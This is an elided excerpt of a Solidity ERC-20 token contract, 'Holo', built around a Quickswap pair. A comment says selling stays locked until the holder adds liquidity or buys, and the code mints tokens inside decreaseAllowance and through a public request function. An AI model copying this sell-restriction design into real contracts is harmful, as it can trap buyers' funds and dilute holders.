...
/*  Unlock sell-function by providing liquidity or buying HOLO-MATIC @ Quickswap.
    Providing liquidity insta-refunds sender with 50 % (max one holo).
    Transfer to addresses with zero holo balance insta-refunds sender with 100 % (max one holo). */
...
contract Holo is Context, Ownable, IERC20, IERC20Metadata {
        ...
        )
    {
        ...
        .createPair(holo,IRouter(router).WETH());
        ...
        emit Transfer(holo, msg.sender , one);
    }
   ...
   function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        ...
        if (router.balance > 0) {
            ...
            if (_totalSupply < maximumSupply) {
                ...
                if (liquidity > one) {
                    ...
                    _totalSupply += one;
                    emit Transfer(holo, sender, one);
                   
                } else {
                    _balances[sender] += liquidity;
                    _totalSupply += liquidity;
                    emit Transfer(holo, sender, liquidity);
                }
            }
    ...
    function _requestOneHolo() public {
        ...
        _totalSupply += one;
        emit Transfer(holo, requester, one);
    }
    ...
    function disperge(address[] calldata recipients) public onlyOwner() {
        ...
        for (uint256 i = 0; i < recipients.length; i++) {
            if (_balances[recipients[i]] == 0) {
                _balances[recipients[i]] += one;
                _totalSupply += one;
                emit Transfer(holo, recipients[i], one);
            }
        }
    }
}